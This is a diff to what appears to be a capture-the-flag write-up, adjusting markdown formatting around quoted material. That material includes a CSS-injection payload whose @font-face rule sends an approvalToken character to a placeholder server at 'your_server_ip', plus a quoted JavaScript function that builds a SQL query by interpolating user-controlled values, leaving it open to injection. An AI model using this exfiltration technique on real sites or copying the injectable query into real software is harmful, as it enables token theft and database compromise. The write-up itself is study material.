@@ -32,7 +32,6 @@ Since `<p id="approvalToken" class="d-none">{{ approvalToken }}</p>` has a `d-no
     Exfiltrate the `approvalToken` via CSS Injection:
   </summary>
     
-    ```
     @font-face {
         font-family: poc;
         src: url(http://your_server_ip/?a);
@@ -413,7 +412,6 @@ Since `<p id="approvalToken" class="d-none">{{ approvalToken }}</p>` has a `d-no
     #approvalToken{
         font-family: poc;
     }
-    ```
 </details>
 
 Now we have achieved the token characters are not sorted.
@@ -473,7 +471,7 @@ SQLI vulnerability in source code:
     		headers: {
     			'Content-Type': 'application/json',
     		},
-    		body: JSON.stringify({submissionID: submissionID, **pagination: pagination**}),
+    		body: JSON.stringify({submissionID: submissionID, pagination: pagination}),
     	})
     	
     //...
@@ -487,7 +485,7 @@ SQLI vulnerability in source code:
     async getSubmissionComments(submissionID, pagination=10) {
     	return new Promise(async (resolve, reject) => {
     		try {
-                  const stmt = **`SELECT content FROM comments WHERE id_submission = ${submissionID} LIMIT ${pagination}`**;
+                  const stmt = `SELECT content FROM comments WHERE id_submission = ${submissionID} LIMIT ${pagination}`;
                   resolve(await this.db.all(stmt));
     		} catch(e) {
     			reject(e);
